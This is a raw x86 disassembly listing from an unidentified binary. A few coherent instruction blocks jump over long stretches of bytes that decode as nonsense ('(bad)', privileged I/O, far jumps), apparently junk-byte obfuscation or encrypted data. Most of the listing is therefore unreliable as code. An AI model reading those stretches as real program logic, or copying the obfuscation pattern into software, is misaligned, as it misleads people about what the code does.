  41474e:	shl    ecx,0x1e
  414751:	or     ecx,eax
  414753:	mov    DWORD PTR [ebp-0x80],ecx
  414756:	lea    eax,[ebp-0x80]
  414759:	push   eax
  41475a:	mov    eax,DWORD PTR [ebp+0x10]
  41475d:	mov    ecx,DWORD PTR [ebp+0x14]
  414760:	shrd   eax,ecx,0x2
  414764:	shr    ecx,0x2
  414767:	mov    ecx,DWORD PTR [ebp+0x10]
  41476a:	mov    edx,DWORD PTR [ebp+0x14]
  41476d:	xor    eax,esi
  41476f:	xor    edx,edx
  414771:	or     eax,edx
  414773:	push   eax
  414774:	mov    eax,ds:0x422758
  414779:	mov    edi,0x42269e
  41477e:	push   edi
  41477f:	push   DWORD PTR [eax]
  414781:	shl    ecx,0x1e
  414784:	call   0x41b447
  414789:	lea    eax,[ebp-0x80]
  41478c:	push   eax
  41478d:	mov    eax,DWORD PTR [ebp+0x10]
  414790:	jmp    0x414ac9
  414795:	pop    ds
  414796:	cmp    eax,0xaf9fd01d
  41479b:	das    
  41479c:	lods   eax,DWORD PTR ds:[esi]
  41479d:	sbb    DWORD PTR [esi-0x11115b39],edi
  4147a3:	sbb    cl,dl
  4147a5:	stos   DWORD PTR es:[edi],eax
  4147a6:	sahf   
  4147a7:	mov    esi,0xbec4edbe
  4147ac:	mov    esi,0xdb1eb856
  4147b1:	sub    DWORD PTR [eax-0x1c43c73f],edx
  4147b7:	sub    al,0x86
  4147b9:	stc    
  4147ba:	xchg   edx,eax
  4147bb:	ss push edx
  4147bd:	(bad)  [edx+0x11]
  4147c0:	jmp    0x4e7b:0x9f6a
  4147c6:	popa   
  4147c7:	mov    DWORD PTR ds:0x33e13593,edx
  4147cd:	sti    
  4147ce:	add    BYTE PTR [esi-0x21],bh
  4147d1:	xor    edx,DWORD PTR fs:[edi+0x29]
  4147d5:	xor    al,BYTE PTR ds:0x7a21773c
  4147db:	mov    eax,0xbf0d6150
  4147e0:	jmp    0x7d0e:0x2d94df61
  4147e7:	adc    al,0x6e
  4147e9:	push   0x2f491df8
  4147ee:	icebp  
  4147ef:	sbb    DWORD PTR [edi+ebx*2+0x52888d67],esp
  4147f6:	adc    ebp,DWORD PTR [esi-0x23]
  4147f9:	dec    ecx
  4147fa:	inc    eax
  4147fb:	cmp    edx,DWORD PTR ds:0xe8cdc3bf
  414801:	fisub  WORD PTR [edi]
  414803:	push   esp
  414804:	xor    ecx,ecx
  414806:	adc    al,bl
  414808:	xchg   BYTE PTR [ebx+0x8f593ba],dh
  41480e:	xchg   ebx,eax
  41480f:	aam    0xc0
  414811:	pop    ds
  414812:	push   eax
  414813:	mov    ch,BYTE PTR [esi-0x4c2e05cb]
  414819:	sti    
  41481a:	fsub   st(4),st
  41481c:	dec    edi
  41481d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41481e:	add    bl,ch
  414820:	lahf   
  414821:	mov    ch,0x52
  414823:	mov    edi,0x3daad3ac
  414828:	inc    eax
  414829:	shl    BYTE PTR ds:0x54d80028,1
  41482f:	sar    DWORD PTR [ecx+0x6e],cl
  414832:	fldcw  WORD PTR [ebx+0x39df550e]
  414838:	imul   edi,DWORD PTR [ebx-0x3],0x16
  41483c:	hlt    
  41483d:	nop
  41483e:	adc    ebp,DWORD PTR [edi]
  414840:	inc    ecx
  414841:	inc    eax
  414842:	add    eax,0x994a29b
  414847:	out    dx,al
  414848:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414849:	(bad)  
  41484a:	cmp    ecx,edi
  41484c:	stos   DWORD PTR es:[edi],eax
  41484d:	jnp    0x4147e0
  41484f:	repz popf 
  414851:	or     eax,0xe461d492
  414856:	and    eax,0xc43570a9
  41485b:	add    DWORD PTR ds:0xd4234f56,ebp
  414861:	push   eax
  414862:	push   eax
  414863:	push   es
  414864:	clc    
  414865:	data16 xchg BYTE PTR [eax+0xf76d83f],dh
  41486c:	xlat   BYTE PTR ds:[ebx]
  41486d:	lds    ecx,FWORD PTR [ecx+0x1a0a7d39]
  414873:	inc    esp
  414874:	mov    ecx,0x8b9a3696
  414879:	push   esp
  41487a:	and    ah,BYTE PTR [edi-0x2c]
  41487d:	sub    dh,BYTE PTR [ebx+ecx*4]
  414880:	jg     0x41488a
  414882:	cs mov ebx,0xd6e9b810
  414888:	sub    eax,0xf795132c
  41488d:	and    ebx,ecx
  41488f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414890:	pop    esi
  414891:	mov    bh,ah
  414893:	sub    BYTE PTR [ecx-0x2a],ch
  414896:	push   0x2b
  414898:	lods   al,BYTE PTR gs:[esi]
  41489a:	jmp    0xec55:0x76da714
  4148a1:	dec    edi
  4148a2:	sbb    DWORD PTR [ebp+0x50],edi
  4148a5:	mov    fs,WORD PTR [edx+0x14ea6d33]
  4148ab:	xor    esi,0xfa49b75d
  4148b1:	xor    DWORD PTR [esp+eax*8],eax
  4148b4:	data16 and al,0x9d
  4148b7:	mov    bl,0x1c
  4148b9:	xchg   BYTE PTR [ecx],dh
  4148bb:	sub    al,0xd5
  4148bd:	sbb    BYTE PTR ds:0x729e36b4,0xe7
  4148c4:	jbe    0x4148ef
  4148c6:	(bad)  
  4148c7:	fdivr  DWORD PTR [esi+0x66]
  4148ca:	hlt    
  4148cb:	jne    0x414906
  4148cd:	repz pop edi
  4148cf:	pop    es
  4148d0:	fdiv   DWORD PTR [ecx-0x4048bb43]
  4148d6:	call   0xf601:0xeb718ce7
  4148dd:	ficom  DWORD PTR [edx+edi*8-0x69a395e1]
  4148e4:	imul   edx,DWORD PTR [ebx+0x3f6f0033],0x5c228106
  4148ee:	test   al,0x5d
  4148f0:	test   DWORD PTR [ebp+edi*8-0x60a8c966],esp
  4148f7:	dec    esi
  4148f8:	mov    ebp,0xf79060b0
  4148fd:	rcr    BYTE PTR [eax],0x37
  414900:	sub    BYTE PTR [esi+0x7a],0x2a
  414904:	es xchg esp,eax
  414906:	inc    ebp
  414907:	mov    ecx,0xe9ff2c87
  41490c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41490d:	rol    BYTE PTR [eax-0x30],1
  414910:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414911:	xor    cl,BYTE PTR [ebx+eiz*8+0x534fcb75]
  414918:	mov    cl,BYTE PTR [edx]
  41491a:	mov    bl,0x9d
  41491c:	mov    bh,BYTE PTR [esi+0x3b]
  41491f:	adc    DWORD PTR [edi-0x35],ebp
  414922:	dec    BYTE PTR [ebp-0x12]
  414925:	push   ebp
  414926:	push   edi
  414927:	dec    edx
  414928:	iret   
  414929:	cdq    
  41492a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41492b:	xchg   ebx,eax
  41492c:	ja     0x414974
  41492e:	aad    0x24
  414930:	js     0x4148f1
  414932:	mov    eax,0x9ac5f8d1
  414937:	lea    ebx,[ebx-0x5b]
  41493a:	out    0x2e,al
  41493c:	xor    eax,DWORD PTR [esi]
  41493e:	in     al,0xf
  414940:	push   ecx
  414941:	pop    ss
  414942:	mov    ecx,0xd57608b0
  414947:	das    
  414948:	bnd jg 0x414961
  41494b:	iret   
  41494c:	repnz dec ebx
  41494e:	(bad)  
  41494f:	fucomi st,st(4)
  414951:	adc    BYTE PTR [ebx-0x4e],0x5b
  414955:	ret    0xc644
  414958:	std    
  414959:	xchg   ebx,eax
  41495a:	cmp    DWORD PTR [ebp-0x7384ea3c],0xffffff9e
  414961:	jmp    0x414969
  414963:	nop
  414964:	xchg   edi,eax
  414965:	mov    dl,0xd2
  414967:	(bad)  
  414968:	or     ebp,DWORD PTR [eax-0x1ca3531a]
  41496e:	pop    ds
  41496f:	dec    esp
  414970:	nop
  414971:	dec    esp
  414972:	fnstcw WORD PTR ds:0x4e97ee10
  414978:	pop    esi
  414979:	hlt    
  41497a:	lahf   
  41497b:	mov    WORD PTR [eax+0x3],ds
  41497e:	push   ecx
  41497f:	out    0x68,al
  414981:	out    0xae,al
  414983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414984:	add    ah,BYTE PTR [eax]
  414986:	add    eax,0x9b5171f3
  41498b:	jge    0x414963
  41498d:	cmp    edi,edi
  41498f:	aam    0x81
  414991:	(bad)  
  414992:	push   eax
  414993:	xchg   edx,eax
  414994:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414995:	std    
  414996:	jno    0x414963
  414998:	icebp  
  414999:	jle    0x414968
  41499b:	ja     0x41493b
  41499d:	pop    ecx
  41499e:	jnp    0x414982
  4149a0:	je     0x414976
  4149a2:	or     al,0x49
  4149a4:	adc    al,0x29
  4149a6:	jge    0x414980
  4149a8:	cmp    al,0xcf
  4149aa:	cli    
  4149ab:	and    DWORD PTR [ecx+0x17e42c1e],ebp
  4149b1:	stos   DWORD PTR es:[edi],eax
  4149b2:	outs   dx,BYTE PTR ds:[esi]
  4149b3:	adc    eax,0xdf747b30
  4149b8:	mov    fs,WORD PTR [edx]
  4149ba:	sbb    ebx,DWORD PTR [ebp+0x3d]
  4149bd:	pop    eax
  4149be:	jl     0x414a1e
  4149c0:	mov    edi,0xb450e1aa
  4149c5:	(bad)
  4149c9:	int    0xc3
  4149cb:	ja     0x414a28
  4149cd:	sar    BYTE PTR [edx+edx*2],1
  4149d0:	aad    0x96
  4149d2:	test   ebx,eax
  4149d4:	fdivr  st,st(3)
  4149d6:	xchg   ecx,eax
  4149d7:	scas   al,BYTE PTR es:[edi]
  4149d8:	inc    ebp
  4149d9:	je     0x414a03
  4149db:	lods   eax,DWORD PTR ds:[esi]
  4149dc:	xchg   ebp,eax
  4149dd:	div    esi
  4149df:	add    bh,bh
  4149e1:	inc    edi
  4149e2:	mov    ah,BYTE PTR [edx+eiz*4]
  4149e5:	sub    BYTE PTR [eax],ch
  4149e7:	std    
  4149e8:	push   DWORD PTR [ecx]
  4149ea:	ins    BYTE PTR es:[edi],dx
  4149eb:	(bad)  
  4149ec:	shl    DWORD PTR [ecx],1
  4149ee:	(bad)  
  4149ef:	or     eax,0x89ada82d
  4149f4:	(bad)  
  4149f5:	not    bl
  4149f7:	mov    al,ds:0x44d23150
  4149fc:	fsubr  DWORD PTR [ebx+0x5d4cf213]
  414a02:	sar    BYTE PTR [edi+0x72],cl
  414a05:	and    dh,al
  414a07:	fisubr DWORD PTR [ebx-0x3e]
  414a0a:	xor    BYTE PTR [ebx+ebp*1+0x61],ch
  414a0e:	call   0xa8ef4d62
  414a13:	mov    edx,ss
  414a15:	adc    bl,BYTE PTR [ebx]
  414a17:	lods   eax,DWORD PTR ds:[esi]
  414a18:	dec    ebp
  414a19:	(bad)  
  414a1a:	test   al,0xfc
  414a1c:	imul   edi
  414a1e:	pop    ds
  414a1f:	dec    ecx
  414a20:	or     esp,DWORD PTR [eax+0x54ad662f]
  414a26:	xchg   ebp,eax
  414a27:	(bad)  
  414a28:	in     al,dx
  414a29:	cmp    ecx,eax
  414a2b:	mov    DWORD PTR [edi],edx
  414a2d:	ins    DWORD PTR es:[edi],dx
  414a2e:	adc    cl,BYTE PTR [eax-0xfbb1c89]
  414a34:	adc    al,0xc2
  414a36:	inc    esi
  414a37:	js     0x414a2b
  414a39:	mov    ecx,0xb8baf4d3
  414a3e:	inc    ecx
  414a3f:	outs   dx,DWORD PTR ds:[esi]
  414a40:	jbe    0x414a13
  414a42:	jge    0x414a55
  414a44:	or     ah,BYTE PTR [edx]
  414a46:	xor    ch,cl
  414a48:	icebp  
  414a49:	stos   BYTE PTR es:[edi],al
  414a4a:	add    DWORD PTR [ebp+edx*2+0x66b2b5e2],esi
  414a51:	into   
  414a52:	and    DWORD PTR [ebp-0x50116e34],eax
  414a58:	loope  0x414a35
  414a5a:	bound  eax,QWORD PTR [edi+edi*1]
  414a5d:	add    eax,0x4a74fb36
  414a62:	icebp  
  414a63:	inc    esp
  414a64:	in     eax,dx
  414a65:	pop    ss
  414a66:	outs   dx,DWORD PTR ds:[esi]
  414a67:	in     al,dx
  414a68:	jle    0x414a35
  414a6a:	jb     0x414aab
  414a6c:	or     eax,0xf58d1ebc
  414a71:	daa    
  414a72:	xchg   DWORD PTR [esi-0x3ef59606],eax
  414a78:	ret    
  414a79:	lds    esp,FWORD PTR [ebx+ebp*1]
  414a7c:	xchg   ecx,eax
  414a7d:	push   esp
  414a7e:	rol    DWORD PTR [ebp+0x4c],cl
  414a81:	dec    sp
  414a83:	adc    eax,0x4ec2219
  414a88:	popf   
  414a89:	inc    eax
  414a8a:	xor    BYTE PTR [ebp-0x1b80fa87],dl
  414a90:	jl     0x414ade
  414a92:	clc    
  414a93:	hlt    
  414a94:	gs cdq 
  414a96:	cmp    DWORD PTR [edx+0x59],edi
  414a99:	nop
  414a9a:	mov    eax,0x53e850f8
  414a9f:	mov    edx,0x8bd6edc4
  414aa4:	aam    0x7b
  414aa6:	cli    
  414aa7:	mov    eax,ds:0x579748ce
  414aac:	bound  esi,QWORD PTR [ecx-0x56]
  414aaf:	std    
  414ab0:	pop    es
  414ab1:	int    0x17
  414ab3:	dec    esp
  414ab4:	mov    BYTE PTR [edi+0x5853c4f8],ch
  414aba:	das    
  414abb:	and    DWORD PTR [ecx+0x1f],0xb5525f4
  414ac2:	or     bl,BYTE PTR [ebx-0x55]
  414ac5:	std    
  414ac6:	ins    BYTE PTR es:[edi],dx
  414ac7:	cdq    
  414ac8:	repz mov ecx,DWORD PTR [ebp+0x14]
  414acc:	shrd   eax,ecx,0x2
  414ad0:	shr    ecx,0x2
  414ad3:	mov    ecx,DWORD PTR [ebp+0x10]
  414ad6:	mov    edx,DWORD PTR [ebp+0x14]
  414ad9:	xor    eax,esi
  414adb:	xor    edx,edx
  414add:	or     eax,edx
  414adf:	push   eax
  414ae0:	mov    eax,ds:0x422758
  414ae5:	push   edi
  414ae6:	push   DWORD PTR [eax]
  414ae8:	shl    ecx,0x1e
  414aeb:	call   0x41b447
  414af0:	mov    eax,DWORD PTR [ebp-0x3c]
  414af3:	mov    eax,DWORD PTR [ebp-0x2c]
  414af6:	mov    edi,DWORD PTR [ebp-0x24]
  414af9:	mov    eax,DWORD PTR [ebp-0x30]
  414afc:	mov    ecx,edi
  414afe:	mov    DWORD PTR [ebp-0x1c],eax
  414b01:	rol    ecx,0x2
  414b04:	mov    eax,0xa5069bae
  414b09:	xor    ecx,eax
  414b0b:	jmp    0x414e44
  414b10:	fisttp WORD PTR [eax+0x5aac5a8c]
  414b16:	xor    BYTE PTR [esp+edx*1+0x419e14bc],bh
  414b1d:	add    dl,BYTE PTR [edx-0x62]
  414b20:	(bad)  [esi+edi*4-0x413b1242]
  414b27:	mov    esi,0x8915ea08
  414b2c:	sbb    eax,0x571a12de
  414b31:	mov    edx,0xf3ad5d44
  414b36:	clc    
  414b37:	sbb    eax,0x1453a222
  414b3c:	test   BYTE PTR [ebx],cl
  414b3e:	jne    0x414b0d
  414b40:	mov    ds:0xd90b1b2f,eax
  414b45:	jmp    0x70307b9e
  414b4a:	sub    BYTE PTR [esi],dh
  414b4c:	out    dx,eax
  414b4d:	bound  ecx,QWORD PTR [edi+ebx*1]
  414b50:	aam    0x5d
  414b52:	xlat   BYTE PTR ds:[ebx]
  414b53:	jnp    0x414b5a
  414b55:	jnp    0x414b6b
  414b57:	cmp    DWORD PTR [esi+0x44],ebx
  414b5a:	jns    0x414b1e
  414b5c:	lods   eax,DWORD PTR ds:[esi]
  414b5d:	jl     0x414b0c
  414b5f:	add    cl,BYTE PTR [edx+0x43a7ba5f]
  414b65:	and    ebx,DWORD PTR [ebp+0x7c9db1bf]
  414b6b:	push   edi
  414b6c:	retf   0xee93
  414b6f:	test   al,0xaa
  414b71:	push   ds
  414b72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b73:	cmc    
  414b74:	jmp    0xd76fd57a
  414b79:	imul   bp,WORD PTR [ebp-0x69],0x1
  414b7e:	sub    BYTE PTR [ecx],0x23
  414b81:	sti    
  414b82:	pop    ss
  414b83:	push   es
  414b84:	and    eax,0x3550bbc5
  414b89:	pop    edx
  414b8a:	hlt    
  414b8b:	in     al,0x87
  414b8d:	mov    edi,0x96377d1c
  414b92:	cwde   
  414b93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b94:	stc    
  414b95:	dec    eax
  414b96:	js     0x414c07
  414b98:	mov    ebx,0x3bec7f72
  414b9d:	cmp    ebp,DWORD PTR [ebx-0x26]
  414ba0:	data16 aam 0x93
  414ba3:	mov    esi,0xc97a3258
  414ba8:	je     0x414bfe
  414baa:	cmp    ebp,ebx
  414bac:	mov    al,ds:0x327e30c4
  414bb1:	retf   
  414bb2:	(bad)  
  414bb3:	js     0x414bfb
  414bb5:	mov    ch,BYTE PTR [eax+0x7b2e75e2]
  414bbb:	mov    dh,0x64
  414bbd:	push   edi
  414bbe:	jle    0x414c11
  414bc0:	aas    
  414bc1:	mov    eax,0x84cd7064
  414bc6:	adc    ah,BYTE PTR [eax+0x5d]
  414bc9:	std    
  414bca:	xor    BYTE PTR cs:[ebx+ebp*2+0x789b95c7],0xe2
  414bd3:	shl    dh,1
  414bd5:	fnstsw WORD PTR [ebx]
  414bd7:	lea    esp,[eax]
  414bd9:	push   0xb3d73375
  414bde:	bound  edi,QWORD PTR [esi]
  414be0:	xor    ecx,DWORD PTR ds:0x25e1eb05
  414be6:	jbe    0x414bc9
  414be8:	sbb    BYTE PTR [ebx+0x1ff2550d],dl
  414bee:	lods   eax,DWORD PTR ds:[esi]
  414bef:	mov    ch,0xe
  414bf1:	jmp    0xff90:0x602e1ac6
  414bf8:	push   cs
  414bf9:	cmp    eax,0xec0f9fc0
  414bfe:	iret   
  414bff:	or     eax,0x4463c388
  414c04:	lahf   
  414c05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c06:	jp     0x414c43
  414c08:	mov    ds:0x1403c1cd,eax
  414c0d:	imul   ebx,DWORD PTR [edx],0xfffffff0
  414c10:	add    al,0xa6
  414c12:	fldenv [edx]
  414c14:	xchg   DWORD PTR gs:[ecx],eax
  414c17:	pusha  
  414c18:	fisub  DWORD PTR [ecx]
  414c1a:	popf   
  414c1b:	scas   al,BYTE PTR es:[edi]
  414c1c:	aas    
  414c1d:	dec    ebx
  414c1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c1f:	or     DWORD PTR [ebx+eax*2+0x198ed443],eax
  414c26:	inc    esp
  414c27:	inc    ebx
  414c28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c29:	mov    ds:0xd0db0e48,al
  414c2e:	shl    DWORD PTR [eax],cl
  414c30:	jne    0x414c5a
  414c32:	call   0x7998e60e
  414c37:	cmp    BYTE PTR [ebx],0x26
  414c3a:	sar    BYTE PTR [edi+edx*2+0x50],1
  414c3e:	mov    ds:0xc1ad1ec6,al
  414c43:	loope  0x414cb5
  414c45:	aas    
  414c46:	retf   
  414c47:	(bad)  
  414c48:	cmp    eax,0xc4d8274f
  414c4d:	aas    
  414c4e:	jp     0x414bec
  414c50:	inc    eax
  414c51:	mov    BYTE PTR [edx+ebx*2-0x6d],ch
  414c55:	sbb    DWORD PTR ds:0x22091f59,edx
  414c5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c5c:	cli    
  414c5d:	js     0x414cd1
  414c5f:	mov    ds,WORD PTR [edi-0x1c]
  414c62:	loop   0x414bf2
  414c64:	mov    ebp,0x56f0f696
  414c69:	xchg   esp,eax
  414c6a:	(bad)  
  414c6b:	fld    DWORD PTR [edi+0xba8b50b]
  414c71:	or     ch,al
  414c73:	push   ds
  414c74:	pop    ebp
  414c75:	(bad)  
  414c76:	stos   BYTE PTR es:[edi],al
  414c77:	cmp    DWORD PTR [esi],ebx
  414c79:	cmp    BYTE PTR [ebx+0x6c],0x86
  414c7d:	mov    dh,0x6e
  414c7f:	pop    ebp
  414c80:	push   0xffffffb6
  414c82:	enter  0x3a71,0x0
  414c86:	xchg   edi,eax
  414c87:	mov    ch,0x23
  414c89:	cld    
  414c8a:	in     al,0x38
  414c8c:	mov    esi,0x8b33740b
  414c91:	ret    
  414c92:	cli    
  414c93:	idiv   DWORD PTR [edx-0x38f9fdde]
  414c99:	dec    ebp
  414c9a:	idiv   BYTE PTR [eax+0x8]
  414c9d:	ja     0x414cf0
  414c9f:	jb     0x414d0d
  414ca1:	jecxz  0x414ce1
  414ca3:	fs dec esi
  414ca5:	fiadd  DWORD PTR [edi-0x2545e048]
  414cab:	adc    ebx,DWORD PTR [ecx+0x4163e546]
  414cb1:	icebp  
  414cb2:	sub    BYTE PTR [ebx-0x6b4f51d5],ch
  414cb8:	out    dx,eax
  414cb9:	cmp    ch,BYTE PTR [esi-0x7a]
  414cbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cbd:	and    al,0xb4
  414cbf:	and    ebx,edi
  414cc1:	nop
  414cc2:	scas   al,BYTE PTR es:[edi]
  414cc3:	not    BYTE PTR [eax+0x69]
  414cc6:	test   BYTE PTR [eax+0x6bb6e3b6],bl
  414ccc:	lods   eax,DWORD PTR ds:[esi]
  414ccd:	and    bh,BYTE PTR [ecx]
  414ccf:	mov    ds:0x87f7d4c3,al
  414cd4:	imul   ecx,DWORD PTR [ecx],0x35
  414cd7:	ror    DWORD PTR ds:0x1439666c,1
  414cdd:	(bad)  
  414cde:	push   ds
  414cdf:	out    dx,eax
  414ce0:	dec    ecx
  414ce1:	and    edi,DWORD PTR [esi+ecx*8-0x1144bb64]
  414ce8:	cli    
  414ce9:	mov    ch,0x87
  414ceb:	fcom   QWORD PTR [edi+0x7a]
  414cee:	fstp   TBYTE PTR [ebx]
  414cf0:	push   0xb91daa0
  414cf5:	loopne 0x414c81
  414cf7:	fnstenv [esi+0xb]
  414cfa:	sub    DWORD PTR [esp+eax*4+0x11],esp
  414cfe:	inc    ebx
  414cff:	shl    DWORD PTR [edx-0x18],0x30
  414d03:	test   DWORD PTR [edx+0x7c1a4448],0x6bfc2067
  414d0d:	pop    edx
  414d0e:	cmp    al,0x4b
  414d10:	mov    dl,0x5f
  414d12:	clc    
  414d13:	popf   
  414d14:	fld    QWORD PTR [edi+0x36]
  414d17:	nop
  414d18:	mov    ebp,0xe88da700
  414d1d:	sub    al,0x63
  414d1f:	sub    bh,cl
  414d21:	xor    ebx,edx
  414d23:	int3   
  414d24:	and    bl,BYTE PTR [edx+ebx*4]
  414d27:	sub    esi,ebp
  414d29:	mov    esi,0x114e1f06
  414d2e:	iret   
  414d2f:	cli    
  414d30:	popa   
  414d31:	bound  esp,QWORD PTR [ebx+edx*2+0x71fe4b18]
  414d38:	arpl   WORD PTR [ebx],sp
  414d3a:	lods   eax,DWORD PTR ds:[esi]
  414d3b:	mov    bh,0x66
  414d3d:	mov    DWORD PTR [edi-0x6f],edx
  414d40:	mov    dl,0xe9
  414d42:	lahf   
  414d43:	push   ds
  414d44:	retf   0x1b1c
  414d47:	or     DWORD PTR [edx+ebp*2+0x2dc4a7cd],0xe71fe780
  414d52:	scas   eax,DWORD PTR es:[edi]
  414d53:	sbb    al,BYTE PTR [esi+0x71]
  414d56:	(bad)  
  414d58:	aam    0x19
  414d5a:	jns    0x414d66
  414d5c:	dec    edx
  414d5d:	(bad)  
  414d5f:	test   al,0x9c
  414d61:	clc    
  414d62:	dec    ebp
  414d63:	jno    0x414d24
  414d65:	pushf  
  414d66:	(bad)  
  414d67:	ins    DWORD PTR es:[edi],dx
  414d68:	push   ebp
  414d69:	xor    al,0x8d
  414d6b:	add    ebp,DWORD PTR [ecx]
  414d6d:	mov    ebp,0x54de37a4
  414d72:	(bad)  
  414d73:	adc    ebp,DWORD PTR [ecx]
  414d75:	sar    al,cl
  414d77:	enter  0xc9c3,0xd5
  414d7b:	repz cld 
  414d7d:	xor    al,0xe4
  414d7f:	mov    ah,0x6f
  414d81:	xor    eax,0x8f7f79f3
  414d86:	dec    esp
  414d87:	adc    edx,DWORD PTR [ebp-0x20b7c493]
  414d8d:	popf   
  414d8e:	lahf   
  414d8f:	js     0x414d79
  414d91:	data16 sbb bh,BYTE PTR [edi]
  414d94:	outs   dx,DWORD PTR ds:[esi]
  414d95:	xchg   edi,eax
  414d96:	cmp    eax,0x258b9c37
  414d9b:	jl     0x414de1
  414d9d:	int3   
  414d9e:	cmp    eax,0x6ef1f392
  414da3:	ret    
  414da4:	sub    al,0x41
  414da6:	add    BYTE PTR [ecx+0x66],0x71
  414daa:	call   0x43588f3d
  414daf:	pop    es
  414db0:	sub    eax,0x6c342247
  414db5:	add    bh,BYTE PTR [ecx-0x67]
  414db8:	mov    ds:0x6662cf89,eax
  414dbe:	mov    bh,0x19
  414dc0:	add    DWORD PTR [esi-0x52],ebx
  414dc3:	mov    edx,DWORD PTR [edi-0x9420453]
  414dc9:	dec    ebx
  414dca:	dec    eax
  414dcb:	call   0x874768aa
  414dd0:	pushf  
  414dd1:	xlat   BYTE PTR ds:[ebx]
  414dd2:	mov    ah,0x6
  414dd4:	mov    al,cl
  414dd6:	sub    esi,DWORD PTR [ecx]
  414dd8:	(bad)  [ecx]
  414dda:	dec    esp
  414ddb:	and    BYTE PTR [ebp+0x54],dh
  414dde:	aas    
  414ddf:	call   0xa8fe:0x323b5bf4
  414de6:	adc    bh,BYTE PTR [ecx-0x54]
  414de9:	mov    cl,0x60
  414deb:	test   al,0x89
  414ded:	xchg   edx,eax
  414dee:	push   0xffffffc6
  414df0:	repz mov esi,0x7718903c
  414df6:	push   edx
  414df7:	pop    edi
  414df8:	push   ebp
  414df9:	gs push ecx
  414dfb:	xor    eax,0x2dd5ee1b
  414e00:	shl    BYTE PTR [eax+0x1c],cl
  414e03:	mov    BYTE PTR [edi],ch
  414e05:	jle    0x414d9b
  414e07:	loope  0x414e7c
  414e09:	retf   0xb160
  414e0c:	mov    cl,cl
  414e0e:	push   0x20
  414e10:	mov    WORD PTR [ebp+0x1f339155],es
  414e16:	push   cs
  414e17:	push   ds
  414e18:	lods   eax,DWORD PTR ds:[esi]
  414e19:	jne    0x414dad
  414e1b:	lahf   
  414e1c:	adc    DWORD PTR [ecx+0x1dd0a6d2],ebp
  414e22:	and    eax,0xd380d944
  414e27:	xor    dl,BYTE PTR [esi+ebx*1]
  414e2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e2b:	sub    DWORD PTR [ebx+0x4a],esp
  414e2e:	pop    ss
  414e2f:	call   0xb7e37bd0
  414e34:	nop
  414e35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e36:	fwait
  414e37:	xchg   esp,eax
  414e38:	fdiv   st(2),st
  414e3b:	cmc    
  414e3c:	inc    eax
  414e3d:	jnp    0x414e43
  414e3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e40:	pop    ebx
  414e41:	stos   DWORD PTR es:[di],eax
  414e43:	int    0x3b
  414e45:	enter  0x34e9,0x3
  414e49:	add    BYTE PTR [eax],al
  414e4b:	call   0xa44dd255
  414e50:	mov    WORD PTR [edi+0x2a],fs
  414e53:	mov    eax,0xfd9e22a6
  414e58:	pop    ecx
  414e59:	push   eax
  414e5a:	sahf   
  414e5b:	or     al,0xaa
  414e5d:	mov    esi,0xbec4edbe
  414e62:	mov    esi,0x89030c17
  414e67:	out    dx,eax
  414e68:	fs out dx,al
  414e6a:	jp     0x414e3c
  414e6c:	aam    0x11
  414e6e:	fadd   st(0),st
  414e70:	loop   0x414df7
  414e72:	cmp    BYTE PTR ds:0x42a79946,0x95
  414e79:	inc    ecx
  414e7a:	push   edi
  414e7b:	in     eax,0x10
  414e7d:	jb     0x414ec3
  414e7f:	pop    ss
  414e80:	leave  
  414e81:	xor    ebx,DWORD PTR [eax+0x41]
  414e84:	mov    DWORD PTR [edi],ebp
  414e86:	push   ss
  414e87:	out    dx,eax
  414e88:	mov    cl,bh
  414e8a:	lods   al,BYTE PTR ds:[esi]
  414e8b:	and    BYTE PTR [ecx],cl
  414e8d:	gs in  eax,0x68
  414e90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e91:	mov    eax,0x5155315f
  414e96:	jl     0x414ea1
  414e98:	nop
  414e99:	jb     0x414ecb
  414e9b:	test   DWORD PTR [ecx],0xb565c149
  414ea1:	xchg   ecx,eax
  414ea2:	sub    ecx,DWORD PTR [ecx+0xa]
  414ea5:	or     ch,BYTE PTR [edi]
  414ea7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ea8:	and    BYTE PTR ds:0x8430727d,bl
  414eae:	push   eax
  414eaf:	mov    ebx,0x9f8832bc
  414eb4:	xlat   BYTE PTR ds:[ebx]
  414eb5:	xor    BYTE PTR [ebp-0x6f9a9605],al
  414ebb:	xor    ch,BYTE PTR [edx+0x6dd39c7a]
  414ec1:	fwait
  414ec2:	sub    eax,0x3cbe7750
  414ec7:	stos   BYTE PTR es:[edi],al
  414ec8:	stos   BYTE PTR es:[edi],al
  414ec9:	ja     0x414ee6
  414ecb:	stc    
  414ecc:	ret    0x6f73
  414ecf:	adc    al,0x68
  414ed1:	out    0xe1,al
  414ed3:	cwde   
  414ed4:	sub    al,0x70
  414ed6:	jge    0x414ef9
  414ed8:	mov    WORD PTR [esi+0x5fbe26c6],?
  414ede:	pop    ebp
  414edf:	or     edi,DWORD PTR [edx-0x604d4b29]
  414ee5:	or     dh,bh
  414ee7:	cmp    DWORD PTR [eax-0x24f0bd68],0xb3078c5f
  414ef1:	xchg   ebx,eax
  414ef2:	push   es
  414ef3:	rcl    DWORD PTR [edi+0x4a3f0a35],1
  414ef9:	mov    ecx,0xdb351bab
  414eff:	jl     0x414f4e
  414f01:	in     al,dx
  414f02:	adc    BYTE PTR [ecx],0x39
  414f05:	pxor   mm1,QWORD PTR [esi+0x7d9a4c05]
